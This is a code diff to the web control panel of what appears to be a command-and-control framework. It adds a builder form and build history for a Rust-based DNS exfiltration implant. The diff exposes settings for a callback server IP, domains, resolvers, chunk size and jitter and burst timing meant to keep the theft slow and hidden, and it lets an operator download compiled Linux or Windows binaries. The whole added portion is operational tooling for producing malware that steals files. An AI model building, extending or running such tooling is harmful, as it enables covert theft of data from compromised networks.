@@ -547,6 +547,89 @@
                 <button class="btn-build" onclick="buildClient()">Build Beacon Client</button>
             </div>
 
+            <!-- Exfil Client Builder -->
+            <div class="builder-card">
+                <div class="builder-title">Exfil Client</div>
+                <div class="builder-description">
+                    Package the Rust-based DNS exfiltration implant with embedded configuration for high-throughput file exfiltration.
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Active DNS Domains</label>
+                    <div id="exfilDNSServersList" style="background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 4px; min-height: 80px; color: #444;">
+                        Loading DNS servers...
+                    </div>
+                    <div class="help-text">Leave custom domains empty to automatically use all active DNS servers.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Custom Domains (optional)</label>
+                    <textarea id="exfilDomains" class="form-input" style="min-height: 70px;" placeholder="corp-files.example, cache.example"></textarea>
+                    <div class="help-text">Comma or newline separated list. Overrides the auto-generated domain list above.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Server IP *</label>
+                    <input type="text" id="exfilServerIP" class="form-input" placeholder="10.0.0.10">
+                    <div class="help-text">IP address that DNS servers should forward exfil traffic to. Autofills from active DNS servers when available.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Resolver Overrides (optional)</label>
+                    <textarea id="exfilResolvers" class="form-input" style="min-height: 70px;" placeholder="9.9.9.9:53, 1.1.1.1:53"></textarea>
+                    <div class="help-text">Comma or newline separated resolvers the implant should prefer. Leave empty to use system defaults.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Chunk Size (bytes)</label>
+                    <input type="number" id="exfilChunkBytes" class="form-input" value="180" min="64" max="220">
+                    <div class="help-text">Payload per DNS answer. 180 bytes is a safe default.</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Jitter Between Chunks (ms)</label>
+                    <div class="form-row">
+                        <input type="number" id="exfilJitterMin" class="form-input" value="1500">
+                        <input type="number" id="exfilJitterMax" class="form-input" value="4000">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Chunks Per Burst</label>
+                    <input type="number" id="exfilChunksPerBurst" class="form-input" value="8">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Burst Pause (ms)</label>
+                    <input type="number" id="exfilBurstPause" class="form-input" value="15000">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Platform *</label>
+                    <select id="exfilPlatform" class="form-select">
+                        <option value="linux">Linux (recommended)</option>
+                        <option value="windows">Windows (experimental)</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Architecture *</label>
+                    <select id="exfilArchitecture" class="form-select">
+                        <option value="amd64">x86_64 (amd64)</option>
+                        <option value="386">x86 (32-bit)</option>
+                        <option value="arm64">ARM 64-bit (arm64)</option>
+                        <option value="armv7l">ARM v7 (armv7l)</option>
+                        <option value="arm">ARM (generic)</option>
+                    </select>
+                </div>
+
+                <div class="help-text" style="margin-top:-5px; margin-bottom:10px;">
+                    Windows ARM builds must run on a Windows host with Visual Studio Build Tools installed. Linux ARM targets require the matching <code>*-linux-gnu-gcc</code> cross toolchains.
+                </div>
+
+                <button class="btn-build" onclick="buildExfilClient()">Build Exfil Client</button>
+            </div>
+
             <!-- Stager Builder -->
             <div class="builder-card">
                 <div class="builder-title">Stager</div>
@@ -627,6 +710,16 @@
                 <div style="text-align: center; color: #444; padding: 20px;">Loading builds...</div>
             </div>
         </div>
+
+        <h1 class="section-title" style="margin-top: 40px;">Exfil Build History</h1>
+        <div class="builder-card" style="max-width: 100%;">
+            <div class="builder-description">
+                Track recent exfil client builds, their embedded domains, and download saved binaries.
+            </div>
+            <div id="exfilBuildsContainer" style="margin-top: 20px;">
+                <div style="text-align: center; color: #444; padding: 20px;">Loading exfil builds...</div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -672,6 +765,17 @@
                 console.error('Fetch error:', error);
                 throw new Error(`Network error: ${error.message}`);
             }
+        }
+
+        function parseListInput(value) {
+            if (!value) {
+                return [];
+            }
+
+            return value
+                .split(/[\n,]+/)
+                .map(item => item.trim())
+                .filter(item => item.length > 0);
         }
 
         function showAlert(message, type = 'success') {
@@ -721,6 +825,27 @@
                     clientList.innerHTML = servers.map(server => 
                         `<div style="padding: 5px; color: #4CAF50;">✓ ${server.domain} (${server.id})</div>`
                     ).join('');
+                }
+
+                const exfilList = document.getElementById('exfilDNSServersList');
+                if (exfilList) {
+                    if (servers.length === 0) {
+                        exfilList.innerHTML = '<span style="color: #555;">No DNS servers available. Build one or specify custom domains.</span>';
+                    } else {
+                        exfilList.innerHTML = servers.map(server => {
+                            const marker = server.status === 'active' ? '✓' : '•';
+                            const addr = server.address ? ` - ${server.address}` : '';
+                            return `<div style="padding: 5px; color: ${server.status === 'active' ? '#4CAF50' : '#777'};">${marker} ${server.domain}${addr}</div>`;
+                        }).join('');
+                    }
+                }
+
+                const exfilServerInput = document.getElementById('exfilServerIP');
+                if (exfilServerInput && !exfilServerInput.value && servers.length > 0) {
+                    const withAddress = servers.find(server => server.address);
+                    if (withAddress && withAddress.address) {
+                        exfilServerInput.value = withAddress.address;
+                    }
                 }
             } catch (error) {
                 console.error('Failed to load DNS servers:', error);
@@ -897,6 +1022,70 @@
             }
         }
 
+        async function buildExfilClient() {
+            const platform = document.getElementById('exfilPlatform').value;
+            const architecture = document.getElementById('exfilArchitecture').value;
+            const serverIP = document.getElementById('exfilServerIP').value.trim();
+            const domains = parseListInput(document.getElementById('exfilDomains').value);
+            const resolvers = parseListInput(document.getElementById('exfilResolvers').value);
+            const chunkBytes = parseInt(document.getElementById('exfilChunkBytes').value, 10) || 0;
+            const jitterMin = parseInt(document.getElementById('exfilJitterMin').value, 10) || 0;
+            const jitterMax = parseInt(document.getElementById('exfilJitterMax').value, 10) || 0;
+            const chunksPerBurst = parseInt(document.getElementById('exfilChunksPerBurst').value, 10) || 0;
+            const burstPause = parseInt(document.getElementById('exfilBurstPause').value, 10) || 0;
+
+            if (!serverIP) {
+                showAlert('Server IP is required for exfil clients.', 'error');
+                return;
+            }
+
+            showLoading('Building exfil client... This can take a couple of minutes');
+
+            try {
+                const response = await authFetch('/api/builder/exfil-client', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        domains,
+                        resolvers,
+                        server_ip: serverIP,
+                        chunk_bytes: chunkBytes,
+                        jitter_min_ms: jitterMin,
+                        jitter_max_ms: jitterMax,
+                        chunks_per_burst: chunksPerBurst,
+                        burst_pause_ms: burstPause,
+                        platform,
+                        architecture
+                    })
+                });
+
+                if (!response) {
+                    throw new Error('Build failed');
+                }
+
+                if (response.ok) {
+                    const blob = await response.blob();
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    const ext = platform === 'windows' ? '.exe' : '';
+                    a.href = url;
+                    a.download = `exfil-${platform}-${architecture}${ext}`;
+                    a.click();
+                    window.URL.revokeObjectURL(url);
+
+                    showAlert('Exfil client built successfully!', 'success');
+                    await loadBuilds();
+                    await loadExfilBuilds();
+                } else {
+                    const error = await response.json().catch(() => ({}));
+                    throw new Error(error.message || 'Build failed');
+                }
+            } catch (error) {
+                showAlert(`Build failed: ${error.message}`, 'error');
+            } finally {
+                hideLoading();
+            }
+        }
+
         async function buildStager() {
             const clientBinaryID = document.getElementById('stagerClientBinary').value;
             const platform = document.getElementById('stagerPlatform').value;
@@ -965,6 +1154,7 @@
         loadDNSServers();
         loadClientBinaries();
         loadBuilds();
+        loadExfilBuilds();
 
         async function loadBuilds() {
             try {
@@ -992,7 +1182,8 @@
                 const typeNames = {
                     'dns-server': 'DNS Servers',
                     'client': 'Clients',
-                    'stager': 'Stagers'
+                    'stager': 'Stagers',
+                    'exfil': 'Exfil Clients'
                 };
 
                 for (const [type, items] of Object.entries(grouped)) {
@@ -1044,6 +1235,73 @@
                 console.error('Failed to load builds:', error);
                 document.getElementById('buildsContainer').innerHTML = 
                     '<div style="text-align: center; color: #dc3545; padding: 20px;">Failed to load builds</div>';
+            }
+        }
+
+        async function loadExfilBuilds() {
+            const container = document.getElementById('exfilBuildsContainer');
+            if (!container) return;
+
+            try {
+                const response = await authFetch('/api/builder/exfil-client/builds');
+                if (!response) return;
+
+                const builds = await response.json();
+                if (!Array.isArray(builds) || builds.length === 0) {
+                    container.innerHTML = '<div style="text-align: center; color: #444; padding: 20px;">No exfil builds yet</div>';
+                    return;
+                }
+
+                let html = `<table style="width: 100%; border-collapse: collapse;">
+                    <thead>
+                        <tr style="background: rgba(255, 51, 51, 0.05); text-align: left;">
+                            <th style="padding: 10px;">Build</th>
+                            <th style="padding: 10px;">Domains</th>
+                            <th style="padding: 10px;">Timing</th>
+                            <th style="padding: 10px; text-align: right;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>`;
+
+                builds.forEach(build => {
+                    const created = build.created_at ? new Date(build.created_at * 1000).toLocaleString() : '—';
+                    const domains = build.domains ? build.domains.split(',').filter(Boolean).join(', ') : '—';
+                    const resolvers = build.resolvers ? `Resolvers: ${build.resolvers}` : '';
+                    const jitter = `${build.jitter_min_ms || '?'}-${build.jitter_max_ms || '?'}`;
+                    const sizeMB = build.file_size ? (build.file_size / 1024 / 1024).toFixed(2) + ' MB' : '—';
+                    const rawPath = build.download_path || '';
+                    const downloadPath = rawPath.replace(/\\/g, '\\').replace(/'/g, "\\'");
+                    const downloadBtn = rawPath ? `
+                        <button onclick="downloadBuild('${downloadPath}')" 
+                            style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 11px;">
+                            Download
+                        </button>` : '<span style="color: #777;">Not saved</span>';
+
+                    html += `<tr style="border-bottom: 1px solid rgba(255, 255, 255, 0.05);">
+                        <td style="padding: 10px; color: #ccc;">
+                            <div style="font-weight: 600;">${build.filename || build.id}</div>
+                            <div style="color: #777; font-size: 12px;">${(build.os || '?')}/${(build.arch || '?')} · IP ${build.server_ip || '—'}</div>
+                            <div style="color: #555; font-size: 12px;">${created} · ${sizeMB}</div>
+                        </td>
+                        <td style="padding: 10px; color: #ccc;">
+                            ${domains}
+                            ${resolvers ? `<div style="color: #777; font-size: 12px;">${resolvers}</div>` : ''}
+                        </td>
+                        <td style="padding: 10px; color: #ccc; font-size: 12px;">
+                            Chunk ${build.chunk_bytes || '?'} bytes<br>
+                            ${build.chunks_per_burst || '?'} chunks/burst<br>
+                            Burst pause ${build.burst_pause_ms || '?'} ms<br>
+                            Jitter ${jitter} ms
+                        </td>
+                        <td style="padding: 10px; text-align: right;">${downloadBtn}</td>
+                    </tr>`;
+                });
+
+                html += '</tbody></table>';
+                container.innerHTML = html;
+            } catch (error) {
+                console.error('Failed to load exfil builds:', error);
+                container.innerHTML = '<div style="text-align: center; color: #dc3545; padding: 20px;">Failed to load exfil builds</div>';
             }
         }
 
